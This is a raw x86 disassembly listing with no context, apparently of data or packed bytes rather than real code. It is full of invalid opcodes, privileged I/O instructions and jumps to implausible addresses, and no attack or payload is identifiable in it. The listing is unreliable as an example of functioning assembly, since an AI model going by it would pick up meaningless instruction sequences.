  4087d8:	push   edx
  4087d9:	dec    esi
  4087da:	fs cmp cl,bh
  4087dd:	(bad)  
  4087de:	xchg   esi,eax
  4087df:	nop
  4087e0:	sbb    ecx,eax
  4087e2:	cld    
  4087e3:	call   0x9b4a5136
  4087e8:	dec    edx
  4087e9:	xchg   edi,eax
  4087ea:	jg     0x40884a
  4087ec:	and    dh,BYTE PTR [esi-0x3b]
  4087ef:	xchg   edx,eax
  4087f0:	nop
  4087f1:	and    BYTE PTR [ebp-0x70],dl
  4087f4:	arpl   WORD PTR ds:0x7ab8bfe,cx
  4087fa:	dec    dh
  4087fc:	sbb    ebp,DWORD PTR [esi+0x62349d93]
  408802:	retf   
  408803:	dec    esi
  408804:	es inc esi
  408806:	dec    esp
  408807:	mov    dh,0xdf
  408809:	outs   dx,DWORD PTR ds:[esi]
  40880a:	fmul   DWORD PTR [edi+0x184f775d]
  408810:	pusha  
  408811:	dec    eax
  408812:	gs push edx
  408814:	stos   DWORD PTR es:[edi],eax
  408815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408816:	jne    0x4087d8
  408818:	push   ds
  408819:	lods   eax,DWORD PTR ds:[esi]
  40881a:	jge    0x4087bf
  40881c:	cmp    cl,BYTE PTR ss:[ebx-0x6ac78d66]
  408823:	dec    esi
  408824:	int    0xbd
  408826:	hlt    
  408827:	pop    eax
  408828:	sbb    bh,dh
  40882a:	fwait
  40882b:	in     al,dx
  40882c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40882d:	shl    DWORD PTR [esi+0x70],cl
  408830:	ins    BYTE PTR es:[edi],dx
  408831:	popa   
  408832:	stc    
  408833:	mov    cs:0x54e140dc,al
  408839:	xor    DWORD PTR [ecx+eax*1+0xc9df587],ebx
  408840:	jge    0x40887b
  408842:	test   ah,dl
  408844:	add    eax,0x982f90e8
  408849:	cmp    al,0xd7
  40884b:	xchg   esi,eax
  40884c:	and    ah,BYTE PTR [edx]
  40884e:	xchg   ecx,eax
  40884f:	or     ah,BYTE PTR [esi]
  408851:	inc    DWORD PTR [edx+ebp*2-0x55]
  408855:	dec    eax
  408856:	clc    
  408857:	or     ch,BYTE PTR [edi]
  408859:	test   eax,0xc4e014a4
  40885e:	mov    ecx,0x8f4fbe38
  408863:	(bad)
  408868:	sbb    al,0x48
  40886a:	sbb    bh,BYTE PTR [ebp+0x39]
  40886d:	push   ebx
  40886e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40886f:	jne    0x4088bf
  408871:	jg     0x4088bc
  408873:	ins    DWORD PTR es:[edi],dx
  408874:	inc    esp
  408875:	xchg   edi,eax
  408876:	adc    ecx,DWORD PTR [edi-0x4035e8b6]
  40887c:	mov    dh,0xfa
  40887e:	cwde   
  40887f:	popa   
  408880:	aaa    
  408881:	sbb    eax,0x934fbc1f
  408886:	adc    cl,BYTE PTR [edx+0x1ef68efd]
  40888c:	mov    BYTE PTR [eax],0x9a
  40888f:	push   0xffffff8b
  408891:	push   ecx
  408892:	push   esp
  408893:	sahf   
  408894:	ja     0x408891
  408896:	mov    WORD PTR [ecx],cs
  408898:	jne    0x40883b
  40889a:	mov    al,ds:0x1a16d698
  40889f:	sbb    DWORD PTR [ebx],0x23ffda7a
  4088a5:	sub    dh,BYTE PTR [edi]
  4088a7:	and    al,0xb4
  4088a9:	or     BYTE PTR [ebx],bl
  4088ab:	jns    0x408899
  4088ad:	out    0xab,al
  4088af:	or     dh,cl
  4088b1:	fbstp  TBYTE PTR [ebp+0x41a664b7]
  4088b7:	inc    DWORD PTR [eax+0x62]
  4088ba:	lods   eax,DWORD PTR ds:[esi]
  4088bb:	mov    eax,ds:0xf7a613f8
  4088c0:	daa    
  4088c1:	add    al,0xd5
  4088c4:	dec    esi
  4088c5:	dec    ebp
  4088c6:	dec    ebp
  4088c7:	out    dx,al
  4088c8:	inc    eax
  4088c9:	or     eax,0x71f2aa42
  4088ce:	adc    DWORD PTR [esi+edx*2-0x7f],ecx
  4088d2:	xchg   edx,eax
  4088d3:	(bad)  
  4088d4:	or     eax,0xccbe655d
  4088d9:	stos   BYTE PTR es:[edi],al
  4088da:	push   eax
  4088db:	leave  
  4088dc:	jge    0x408900
  4088de:	jecxz  0x4088f2
  4088e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088e1:	les    edi,FWORD PTR [ecx+eax*2-0x28b497bd]
  4088e8:	sub    BYTE PTR [edi+eax*1-0x65],dh
  4088ec:	mov    cl,0xf7
  4088ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088ef:	inc    ebp
  4088f0:	aaa    
  4088f1:	pop    ebp
  4088f2:	adc    al,dh
  4088f4:	pop    ds
  4088f5:	lods   eax,DWORD PTR ds:[esi]
  4088f6:	hlt    
  4088f7:	inc    edi
  4088f9:	ja     0x4088b8
  4088fb:	jnp    0x408885
  4088fd:	bnd jo 0x408897
  408900:	leave  
  408901:	lds    eax,FWORD PTR [edx-0x36fac8c]
  408907:	lods   al,BYTE PTR ds:[esi]
  408908:	retf   0x5849
  40890b:	into   
  40890c:	stc    
  40890d:	dec    ebx
  40890e:	jp     0x4088ac
  408910:	scas   eax,DWORD PTR es:[edi]
  408911:	popf   
  408912:	inc    esp
  408913:	inc    esp
  408914:	xchg   edi,eax
  408915:	inc    edx
  408916:	sbb    DWORD PTR [edi-0x58],esp
  408919:	sahf   
  40891a:	add    dh,dh
  40891c:	fcomp  DWORD PTR [ebx]
  40891e:	mov    ch,0x76
  408920:	popf   
  408921:	add    bh,0x62
  408924:	mov    bh,0xbc
  408926:	xor    ch,bh
  408928:	(bad)  
  408929:	xchg   edi,eax
  40892a:	in     al,dx
  40892b:	lahf   
  40892c:	outs   dx,BYTE PTR ds:[esi]
  40892d:	xchg   esi,eax
  40892e:	je     0x408955
  408930:	mov    ecx,0xa8cc0de4
  408935:	pop    ebp
  408936:	fdiv   DWORD PTR [edx-0x18bca010]
  40893c:	into   
  40893d:	div    DWORD PTR [ecx-0xe]
  408940:	push   esi
  408941:	stos   BYTE PTR es:[edi],al
  408942:	(bad)  
  408944:	inc    ebp
  408945:	repnz cli 
  408947:	stos   BYTE PTR es:[edi],al
  408948:	cli    
  408949:	mov    ebx,DWORD PTR [ebp+0x5e]
  40894c:	mov    ds:0x332f47e8,eax
  408951:	ins    DWORD PTR es:[edi],dx
  408952:	mov    al,0xe3
  408954:	or     eax,edi
  408956:	jecxz  0x40898e
  408958:	push   edi
  408959:	and    bl,BYTE PTR [ebx+0x6d722a05]
  40895f:	pop    esp
  408960:	lods   al,BYTE PTR ds:[esi]
  408961:	arpl   cx,bx
  408963:	idiv   BYTE PTR [edx]
  408965:	rcr    DWORD PTR [edx-0x30],1
  408968:	dec    ecx
  408969:	mov    ss,WORD PTR [ebx+0x1551a6a]
  40896f:	fmul   QWORD PTR [edx-0x2b031de2]
  408975:	ret    0x3d6e
  408978:	mov    esp,0x745addd8
  40897d:	imul   ecx,DWORD PTR [eax+0x4],0x6c
  408981:	repnz xlat BYTE PTR ds:[ebx]
  408983:	dec    edx
  408984:	xchg   esp,eax
  408985:	mov    al,0x54
  408987:	pop    edi
  408988:	int    0x2
  40898a:	xor    al,0x64
  40898c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40898d:	popf   
  40898e:	or     BYTE PTR [ecx],0x89
  408991:	xchg   esp,eax
  408992:	pop    esi
  408993:	scas   al,BYTE PTR es:[edi]
  408994:	into   
  408995:	sub    eax,DWORD PTR [esi]
  408997:	bound  esp,QWORD PTR [edx-0x31c282c9]
  40899d:	lock outs dx,BYTE PTR ds:[esi]
  40899f:	or     DWORD PTR ds:0x8e99a799,esp
  4089a5:	adc    edi,eax
  4089a7:	ja     0x408987
  4089a9:	cli    
  4089aa:	and    al,0x2f
  4089ac:	mov    al,BYTE PTR [eax+0x64]
  4089af:	mov    esp,0x262ec287
  4089b4:	out    dx,eax
  4089b5:	mul    DWORD PTR cs:[ebx-0x69]
  4089b9:	add    eax,0x5b5731e4
  4089be:	inc    ebx
  4089bf:	stc    
  4089c0:	hlt    
  4089c1:	popf   
  4089c2:	ficomp WORD PTR [eax]
  4089c4:	stc    
  4089c5:	outs   dx,DWORD PTR ds:[esi]
  4089c6:	hlt    
  4089c7:	loop   0x4089f6
  4089c9:	or     eax,DWORD PTR [ebp+ecx*1-0x635aceac]
  4089d0:	mov    ch,cl
  4089d2:	daa    
  4089d3:	add    al,0x22
  4089d5:	and    al,0x3e
  4089d7:	xchg   ebx,eax
  4089d8:	or     eax,0xc4573bd4
  4089dd:	jae    0x408a1b
  4089df:	mov    esp,0xa7e8f2b7
  4089e4:	inc    ecx
  4089e5:	jle    0x408a29
  4089e7:	pop    ss
  4089e8:	fadd   DWORD PTR [ebp+0x3e0a4443]
  4089ee:	and    BYTE PTR [ebx-0x44724744],al
  4089f4:	dec    edi
  4089f5:	pop    esi
  4089f6:	fcomp  DWORD PTR [esp+eax*8-0x31c1b96c]
  4089fd:	repz xchg edx,eax
  4089ff:	inc    edx
  408a00:	sbb    eax,0xb6a2bfe6
  408a05:	adc    dl,ch
  408a07:	xor    dh,BYTE PTR [ecx+0xa]
  408a0a:	enter  0x91b0,0x1f
  408a0e:	aam    0xc3
  408a10:	xor    ecx,DWORD PTR [edi]
  408a12:	ss sub al,0xad
  408a15:	push   esi
  408a16:	cmp    eax,0xd3183395
  408a1b:	cwde   
  408a1c:	sahf   
  408a1d:	mov    eax,0xf2135e4e
  408a22:	call   0x4d22da7e
  408a27:	cld    
  408a28:	sbb    eax,DWORD PTR [esp+eax*8]
  408a2b:	addr16 repnz retf 0x3468
  408a30:	lock sub eax,0x13cf48c9
  408a36:	lods   al,BYTE PTR ds:[esi]
  408a37:	pop    ebx
  408a38:	repnz stc 
  408a3a:	xchg   edi,eax
  408a3b:	adc    ebx,DWORD PTR [ecx+0x22]
  408a3e:	xor    eax,0xc1581548
  408a43:	sahf   
  408a44:	mov    ?,WORD PTR [eax]
  408a46:	cdq    
  408a47:	cmp    eax,0x33001114
  408a4c:	xchg   esi,eax
  408a4d:	jmp    0xa8c6:0xae7baeea
  408a54:	sub    al,BYTE PTR [ebp+0x71ae2b22]
  408a5a:	jg     0x408a67
  408a5c:	xchg   DWORD PTR [edx+0x42b80200],edx
  408a62:	cmp    BYTE PTR es:[ebx],al
  408a65:	pop    ss
  408a66:	int3   
  408a67:	or     eax,esp
  408a69:	push   edi
  408a6a:	in     al,dx
  408a6b:	cmp    cl,BYTE PTR ds:0xb969abd2
  408a71:	push   ebp
  408a72:	jle    0x408adb
  408a74:	adc    eax,0x8c552be2
  408a79:	pop    ds
  408a7a:	inc    edx
  408a7b:	mov    ch,0x1e
  408a7d:	adc    ebx,ecx
  408a7f:	mov    WORD PTR [ecx+0x16],cs
  408a82:	and    DWORD PTR [edx+0x4a],ebx
  408a85:	dec    edi
  408a86:	add    DWORD PTR [ecx],edx
  408a88:	dec    edi
  408a89:	inc    edi
  408a8a:	(bad)  
  408a8c:	cmp    BYTE PTR [ecx],bh
  408a8e:	fucomi st,st(2)
  408a90:	pop    ebp
  408a91:	xchg   BYTE PTR [ecx-0x2b90f7f4],al
  408a97:	pusha  
  408a98:	inc    ebx
  408a99:	fimul  DWORD PTR [ebx+0x40a9b23a]
  408a9f:	fs xor eax,0xe20c9607
  408aa5:	cli    
  408aa6:	add    bl,BYTE PTR [ebx+0x527e5683]
  408aac:	test   eax,0xca54ea42
  408ab1:	out    dx,al
  408ab2:	xchg   edi,eax
  408ab3:	mov    bh,0x54
  408ab5:	cmp    ebx,DWORD PTR [ebx-0x325da18a]
  408abb:	sahf   
  408abc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408abd:	mov    dh,0xcb
  408abf:	adc    bh,BYTE PTR [ecx]
  408ac1:	xlat   BYTE PTR ds:[ebx]
  408ac2:	cs ss xor dh,cl
  408ac6:	(bad)  
  408ac7:	fadd   QWORD PTR [esi-0x56e6cf09]
  408acd:	sub    DWORD PTR [esi],eax
  408acf:	pop    edx
  408ad0:	aaa    
  408ad1:	and    eax,0x8dd8eaab
  408ad6:	(bad)  
  408ad7:	dec    ebx
  408ad8:	aad    0x3c
  408ada:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408adc:	ins    BYTE PTR es:[edi],dx
  408add:	dec    eax
  408ade:	sbb    al,0x19
  408ae0:	cli    
  408ae1:	(bad)  
  408ae2:	mov    al,0x39
  408ae4:	inc    eax
  408ae5:	push   es
  408ae6:	add    ecx,ecx
  408ae8:	aam    0xb1
  408aea:	in     al,dx
  408aeb:	add    bl,dh
  408aed:	fdivr  DWORD PTR [ecx]
  408aef:	or     DWORD PTR [edx+0x5b],esp
  408af2:	inc    ebx
  408af3:	adc    al,BYTE PTR [ecx+0x11]
  408af6:	sbb    ebx,DWORD PTR [eax]
  408af8:	mov    cl,BYTE PTR [ebx+0x4ef2a680]
  408afe:	mov    ebp,0x7ed24f22
  408b03:	mov    esi,0xd2fd4f94
  408b08:	and    DWORD PTR ds:0x3a4fcb47,ebp
  408b0e:	pushf  
  408b0f:	mov    cl,BYTE PTR [eax-0x2d]
  408b12:	lahf   
  408b13:	lock ror BYTE PTR [esi-0x3361e637],cl
  408b1a:	aas    
  408b1b:	out    dx,eax
  408b1c:	hlt    
  408b1d:	xor    esi,DWORD PTR [edx+0x5669ad93]
  408b23:	test   BYTE PTR [esi-0x6a],0x69
  408b27:	push   0xfffffffe
  408b29:	cdq    
  408b2a:	imul   esp,DWORD PTR [eax],0x60
  408b2d:	xchg   BYTE PTR [ebp+eax*2-0x4e07690d],bh
  408b34:	je     0x408b33
  408b36:	pop    eax
  408b37:	xor    esi,DWORD PTR [edx]
  408b39:	dec    esi
  408b3a:	clc    
  408b3b:	jmp    0x408b71
  408b3d:	cmp    DWORD PTR [esi-0x5f854c19],ebp
  408b43:	xor    eax,0x4147efd
  408b48:	xchg   ebp,eax
  408b49:	dec    edx
  408b4a:	(bad)  
  408b4c:	stos   DWORD PTR es:[edi],eax
  408b4d:	out    0x55,eax
  408b4f:	in     al,dx
  408b50:	dec    BYTE PTR [eax+0x7a]
  408b53:	cmp    eax,0x44c3acc
  408b58:	mov    eax,ds:0xef9406b3
  408b5d:	lock out 0x2b,al
  408b60:	sbb    DWORD PTR [esi+0x10d75522],ecx
  408b66:	repnz dec ebp
  408b68:	push   cs
  408b69:	cld    
  408b6a:	outs   dx,BYTE PTR ds:[esi]
  408b6b:	jmp    0x408b9a
  408b6d:	mov    ebx,0xe28aba28
  408b72:	dec    eax
  408b73:	cmp    ecx,DWORD PTR [ebp-0x25]
  408b76:	test   eax,0xffcfd005
  408b7b:	push   ds
  408b7c:	retf   0xc873
  408b7f:	fsubr  DWORD PTR [esi-0x52]
  408b82:	out    0x2a,al
  408b84:	in     eax,dx
  408b85:	addr16 das 
  408b87:	(bad)
  408b8a:	les    ecx,FWORD PTR [edx+0x68]
  408b8d:	out    dx,eax
  408b8e:	ins    DWORD PTR es:[edi],dx
  408b8f:	loope  0x408bc0
  408b91:	int    0x73
  408b93:	and    esi,esi
  408b95:	xor    esi,ecx
  408b97:	xor    al,0xf8
  408b99:	loop   0x408b6f
  408b9b:	sbb    eax,0x18e164f0
  408ba0:	loopne 0x408c17
  408ba2:	mov    dl,0x91
  408ba4:	push   esp
  408ba5:	imul   ebp,DWORD PTR [edx+eiz*2-0x69d3bba4],0x6270797a
  408bb0:	cs into 
  408bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bb3:	mov    ds:0xd2cd483d,eax
  408bb8:	retf   
  408bb9:	scas   eax,DWORD PTR es:[edi]
  408bba:	sbb    ecx,DWORD PTR [ecx+edi*1]
  408bbd:	adc    cl,al
  408bbf:	test   eax,0x896ed63c
  408bc4:	xlat   BYTE PTR ds:[ebx]
  408bc5:	add    al,0x98
  408bc7:	arpl   WORD PTR [edx-0x607dca9b],sp
  408bcd:	dec    ebp
  408bce:	jg     0x408c40
  408bd0:	in     eax,dx
  408bd1:	(bad)  
  408bd2:	lods   al,BYTE PTR ds:[esi]
  408bd3:	add    BYTE PTR [esi-0x76],ah
  408bd6:	cmp    BYTE PTR [edi-0xf6955e0],dh
  408bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bdd:	pusha  
  408bde:	xor    BYTE PTR [eax],0xdd
  408be1:	jb     0x408b9b
  408be3:	or     edx,DWORD PTR [ecx-0x7856b57a]
  408be9:	add    edi,DWORD PTR [ecx*4-0x6dad06df]
  408bf0:	mul    BYTE PTR [edx+0x6f]
  408bf3:	ds out 0xb8,eax
  408bf6:	cli    
  408bf7:	ins    BYTE PTR es:[edi],dx
  408bf8:	xchg   ecx,eax
  408bf9:	push   es
  408bfa:	push   edx
  408bfb:	ret    0x8952
  408bfe:	fild   QWORD PTR [ebp-0x14]
  408c01:	or     ah,BYTE PTR [edi+0x2d]
  408c04:	out    dx,al
  408c05:	or     eax,0x7ef42cbd
  408c0a:	mov    esp,0x3ef2f195
  408c0f:	mov    edi,0xe0ef6808
  408c14:	pop    esp
  408c15:	out    dx,eax
  408c16:	in     eax,0x6f
  408c18:	test   eax,0x25337803
  408c1d:	pop    ss
  408c1e:	lds    eax,FWORD PTR [edx+ebp*4-0x2bbc3dfc]
  408c25:	lods   eax,DWORD PTR ds:[esi]
  408c26:	sbb    al,0xc6
  408c28:	jmp    0x89408791
  408c2d:	xchg   ecx,eax
  408c2e:	pop    edi
  408c2f:	int3   
  408c30:	xchg   esi,eax
  408c31:	jl     0x408c1e
  408c33:	adc    cl,BYTE PTR [eax-0x6a]
  408c36:	inc    edi
  408c37:	das    
  408c38:	rcl    DWORD PTR [edx+0x3f],1
  408c3b:	ins    DWORD PTR es:[edi],dx
  408c3c:	mov    ch,0x31
  408c3e:	xchg   esi,eax
  408c3f:	arpl   WORD PTR [ecx],sp
  408c41:	or     BYTE PTR [esi+0x21cbc5eb],ch
  408c47:	pop    esi
  408c48:	sti    
  408c49:	imul   esi,esi,0x8b551565
  408c4f:	shl    DWORD PTR [esi-0x22],1
  408c52:	inc    ebp
  408c53:	mov    ebx,DWORD PTR [edx]
  408c55:	call   0xe6293c98
  408c5a:	out    0x3f,al
  408c5c:	cli    
  408c5d:	frstor [edx+0x25]
  408c60:	or     DWORD PTR [esi+0x30],ebx
  408c63:	int3   
  408c64:	jecxz  0x408cc6
  408c66:	clc    
  408c67:	sub    ebx,ebp
  408c69:	jae    0x408c8f
  408c6b:	mov    ch,0x8
  408c6d:	xchg   DWORD PTR ds:0x710ec878,eax
  408c73:	jmp    0x408cdd
  408c75:	mov    ebp,0x6065174c
  408c7a:	jecxz  0x408c60
  408c7c:	cmp    bh,BYTE PTR [edi]
  408c7e:	or     BYTE PTR [edi],ah
  408c80:	mov    edi,DWORD PTR [ebx-0x72]
  408c83:	adc    al,0xc1
  408c85:	xor    ah,dh
  408c87:	xlat   BYTE PTR ds:[ebx]
  408c88:	cli    
  408c89:	fnsave [ebx]
  408c8b:	out    dx,eax
  408c8c:	jmp    0xa3c8f071
  408c91:	ss scas eax,DWORD PTR es:[edi]
  408c93:	mov    WORD PTR [eax+0x1],fs
  408c96:	test   al,0xc3
  408c98:	inc    esi
  408c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c9a:	cmp    al,0x47
  408c9c:	pop    esp
  408c9d:	in     al,dx
  408c9e:	mov    edi,0xd1dee329
  408ca3:	adc    al,0x56
  408ca5:	data16 in al,dx
  408ca7:	test   eax,0x562032de
  408cac:	pop    ds
  408cad:	cmp    ebx,DWORD PTR [ecx-0xe]
  408cb0:	js     0x408d29
  408cb2:	mov    al,cl
  408cb4:	pushf  
  408cb5:	ret    0xb0da
  408cb8:	ins    DWORD PTR es:[edi],dx
  408cb9:	adc    al,0xdd
  408cbb:	outs   dx,DWORD PTR ds:[esi]
  408cbc:	cmp    DWORD PTR [esi],eax
  408cbe:	sub    BYTE PTR [ebx+0x7b],dl
  408cc1:	xor    BYTE PTR [esi+0x5cd131a7],ah
  408cc7:	xchg   ecx,eax
  408cc8:	shr    edx,1
  408cca:	mov    dl,BYTE PTR [ebx-0x3292c605]
  408cd0:	in     al,0xd
  408cd2:	xchg   edi,eax
  408cd3:	jae    0x408d36
  408cd5:	mov    esi,0x5ab2dd30
  408cda:	arpl   WORD PTR [ecx-0x5e],ax
  408cdd:	in     al,0xf3
  408cdf:	stos   DWORD PTR es:[edi],eax
  408ce0:	add    BYTE PTR [eax+0x48f5525a],ch
  408ce6:	scas   al,BYTE PTR es:[edi]
  408ce7:	cmp    edi,DWORD PTR [esi]
  408ce9:	xchg   edx,eax
  408cea:	push   esi
  408ceb:	and    ecx,DWORD PTR [eax-0xf069909]
  408cf1:	sbb    BYTE PTR [ecx-0x559c2393],ch
  408cf7:	test   al,0xaf
  408cf9:	imul   ebp,DWORD PTR [eax+eiz*4-0x7a3cec48],0x78e21aeb
  408d04:	outs   dx,BYTE PTR ds:[esi]
  408d05:	or     eax,0x274286f8
  408d0a:	ret    
  408d0b:	int3   
  408d0c:	xor    al,0x8f
  408d0e:	pop    edx
  408d0f:	push   ds
  408d10:	stc    
  408d11:	dec    edi
  408d12:	mov    ch,0xe4
  408d14:	shr    DWORD PTR [esp+edi*1+0x76],cl
  408d18:	lods   eax,DWORD PTR ds:[esi]
  408d19:	(bad)  
  408d1a:	jecxz  0x408cd5
  408d1c:	(bad)  
  408d1d:	fnstsw WORD PTR [esi+0x40735dba]
  408d23:	cmp    al,0x6e
  408d25:	sub    al,0x92
  408d27:	gs jecxz 0x408d3c
  408d2a:	daa    
  408d2b:	clc    
  408d2c:	cmp    eax,0x3ef2608a
  408d31:	jp     0x408d6d
  408d33:	popf   
  408d34:	xchg   ecx,eax
  408d35:	loop   0x408d7f
  408d37:	(bad)  
  408d38:	or     al,0xc2
  408d3a:	vunpckhps ymm6,ymm4,ymm5
  408d3e:	cmp    BYTE PTR [eax-0x39],0x28
  408d42:	clc    
  408d43:	rcl    BYTE PTR [esi-0x39],1
  408d46:	jle    0x408d61
  408d48:	iret   
  408d49:	add    al,0x53
  408d4b:	sbb    BYTE PTR [edi-0x3838efe7],ah
  408d51:	scas   eax,DWORD PTR es:[edi]
  408d52:	clc    
  408d53:	shl    BYTE PTR [eax-0x2ed7637d],0xf9
  408d5a:	adc    edx,DWORD PTR [ecx-0x39524db8]
  408d60:	mov    al,ds:0x4815892a
  408d65:	sbb    ah,BYTE PTR [ecx]
  408d67:	jne    0x408de7
  408d69:	push   edi
  408d6a:	imul   ebp,DWORD PTR [ebx-0x41bf231a],0x653927c4
  408d74:	imul   eax,DWORD PTR [edi+0x50],0x6ecbb22b
  408d7b:	xor    ecx,DWORD PTR [ecx+0x35]
  408d7e:	mov    esp,0x7c463d50
  408d83:	test   eax,0x15fd28be
  408d88:	icebp  
  408d89:	ficom  DWORD PTR [eax+0x5b]
  408d8c:	lea    edx,[ebx-0x36]
  408d8f:	in     eax,0xfc
  408d91:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  408d93:	mov    dl,0x63
  408d95:	adc    bh,al
  408d97:	add    dh,BYTE PTR [edx-0x3fc15606]
  408d9d:	jl     0x408da4
  408d9f:	sbb    DWORD PTR [edi],ecx
  408da1:	sti    
  408da2:	mov    edx,0xc8238eda
  408da7:	dec    BYTE PTR ds:0x338e89ed
  408dad:	out    0xcf,al
  408daf:	jl     0x408de9
  408db1:	push   ebx
  408db2:	rol    esp,1
  408db4:	inc    ebp
  408db5:	adc    al,al
  408db7:	test   DWORD PTR [ebx-0x798340d9],esi
  408dbd:	jbe    0x408e10
  408dbf:	mov    ah,0x5e
  408dc1:	add    bl,al
  408dc3:	sbb    DWORD PTR [esp+eax*1],ecx
  408dc6:	int    0x35
  408dc8:	retf   
  408dc9:	pop    es
  408dca:	repnz sbb BYTE PTR [ebp-0x34],dh
  408dce:	pop    esp
  408dcf:	dec    ebx
  408dd0:	in     al,0x0
  408dd2:	retf   0xd7b7
  408dd5:	pop    ebp
  408dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dd7:	and    eax,0xb5f7f978
  408ddc:	inc    esi
  408ddd:	shl    DWORD PTR [ebp+edi*1-0x61c5379a],0xa9
  408de5:	mov    bh,0xf9
  408de7:	mov    ds:0x562bc734,eax
  408dec:	sbb    al,0x26
  408dee:	aaa    
  408def:	xor    BYTE PTR [edi],bl
  408df1:	xchg   ecx,eax
  408df3:	add    dl,BYTE PTR ds:0xbac2af7f
  408df9:	inc    esp
  408dfa:	push   edx
  408dfb:	xchg   ecx,eax
  408dfc:	pop    ebx
  408dfd:	sbb    eax,0x8e9f56ed
  408e02:	xchg   esi,eax
  408e03:	add    esp,ebx
  408e05:	jb     0x408de9
  408e07:	mov    BYTE PTR [edx],bl
  408e09:	shr    BYTE PTR [edi+0x35],cl
  408e0c:	inc    edx
  408e0d:	sub    BYTE PTR [ebp+0x751b1710],cl
  408e13:	pop    esi
  408e14:	or     eax,0x7b5c2ec5
  408e19:	pop    ecx
  408e1a:	fistp  DWORD PTR [esi+ebx*1-0xcaf49db]
  408e21:	sbb    DWORD PTR [edi+0x3d],0x2ec03914
  408e28:	sti    
  408e29:	jle    0x408e53
  408e2b:	pop    es
  408e2c:	aam    0xde
  408e2e:	ins    DWORD PTR es:[edi],dx
  408e2f:	mov    dh,0x2
  408e31:	scas   eax,DWORD PTR es:[edi]
  408e32:	add    eax,0x581fd471
  408e37:	les    esi,FWORD PTR [ebp-0x32]
  408e3a:	add    DWORD PTR [edi+0x48],esp
  408e3d:	retf   0x1c9f
  408e40:	out    dx,eax
  408e41:	stos   DWORD PTR es:[edi],eax
  408e42:	stos   DWORD PTR es:[edi],eax
  408e43:	add    al,0x89
  408e45:	mov    edx,0x1cdbd9ad
  408e4a:	adc    edi,DWORD PTR [ebx+0xf]
  408e4d:	pop    edx
  408e4e:	jg     0x408e59
  408e50:	sub    DWORD PTR [eax+0x63ba70cb],edx
  408e56:	jmp    0x408e3d
  408e58:	out    dx,al
  408e59:	hlt    
  408e5a:	test   BYTE PTR [eax+0x79],ch
  408e5d:	retf   0xa8ed
  408e60:	jp     0x408de4
  408e62:	jo     0x408e95
  408e64:	gs mov esi,0x3d16219c
  408e6a:	sbb    DWORD PTR [esi-0x3e79b2f5],0x47
  408e71:	and    bh,BYTE PTR [esi-0x1b]
  408e74:	mov    bh,ah
  408e76:	inc    ecx
  408e77:	call   0x3dbf87cf
  408e7c:	icebp  
  408e7d:	pop    esp
  408e7e:	(bad)  
  408e7f:	sahf   
  408e80:	or     eax,0x21f1f639
  408e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e86:	jg     0x408eb9
  408e88:	mov    edx,0x6e91458a
  408e8d:	int3   
  408e8e:	scas   eax,DWORD PTR es:[edi]
  408e8f:	jle    0x408f09
  408e91:	imul   ebx,DWORD PTR [ebx+0x23],0x44655535
  408e98:	(bad)  [eax]
  408e9a:	or     bh,BYTE PTR [esi+0x45c9c2d5]
  408ea0:	les    eax,FWORD PTR [ecx-0x3d53865f]
  408ea6:	mov    edi,0xa8a6e44f
  408eab:	retf   
  408eac:	pop    ebp
  408ead:	mov    edx,0x53eaf23e
  408eb2:	add    eax,0x40f41b6
  408eb7:	test   eax,0x7e30615b
  408ebc:	das    
  408ebd:	out    dx,eax
  408ebe:	add    ch,bh
  408ec0:	(bad)  [ebx-0x3]
  408ec3:	push   es
  408ec4:	xchg   edx,eax
  408ec5:	aad    0x2b
  408ec7:	bound  esi,QWORD PTR [esi]
  408ec9:	jp     0x408f25
  408ecb:	cmp    al,0x87
  408ecd:	aam    0xf7
  408ecf:	mov    edx,0xedefe3a7
  408ed4:	mov    bh,0xcc
  408ed6:	aaa    
  408ed7:	into   
  408ed8:	xor    dl,BYTE PTR [eax]
  408eda:	aaa    
  408edb:	repnz call FWORD PTR [edi-0x7a4f67e3]
  408ee2:	pop    edx
  408ee3:	std    
  408ee4:	clc    
  408ee5:	adc    eax,0x4cda237d
  408eea:	(bad)  
  408eeb:	in     al,dx
  408eec:	pop    ds
  408eed:	push   edx
  408eee:	jmp    0x408e82
  408ef0:	test   BYTE PTR [edx+0x7b],ah
  408ef3:	arpl   WORD PTR ds:0x483832f7,cx
  408ef9:	jno    0x408ecb
  408efb:	out    0xfd,al
  408efd:	out    0x7c,al
  408eff:	shr    BYTE PTR [eax+0x51775112],1
  408f05:	rol    DWORD PTR [ebx-0x7f],cl
  408f08:	repz icebp 
  408f0a:	cmp    al,0xe6
  408f0c:	dec    edx
  408f0d:	and    DWORD PTR [edx-0x3f5e11c6],0x70
  408f14:	jmp    0x408ec8
  408f16:	jne    0x408eae
  408f18:	outs   dx,BYTE PTR ds:[esi]
  408f19:	adc    al,0xcc
  408f1b:	jbe    0x408f56
  408f1d:	lds    ebp,FWORD PTR [ecx+edx*1-0x73]
  408f21:	pop    ecx
  408f22:	mov    ch,0xbd
  408f24:	sti    
  408f25:	aam    0x57
  408f27:	mov    cs,WORD PTR [esi+0x6b]
  408f2a:	dec    edi
  408f2b:	add    eax,0x8b9eb28c
  408f30:	(bad)  
  408f31:	ror    DWORD PTR [ebx],cl
  408f33:	push   eax
  408f34:	xor    dl,BYTE PTR [esi-0x6]
  408f37:	(bad)  
  408f38:	imul   ecx,DWORD PTR [ecx+0xf013bfd],0x42
  408f3f:	iret   
  408f40:	mov    cl,0x6a
  408f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f43:	xchg   ebp,eax
  408f44:	jnp    0x408f14
  408f46:	jno    0x408f11
  408f48:	ret    
  408f49:	xchg   edi,eax
  408f4a:	xlat   BYTE PTR ds:[ebx]
  408f4b:	dec    ecx
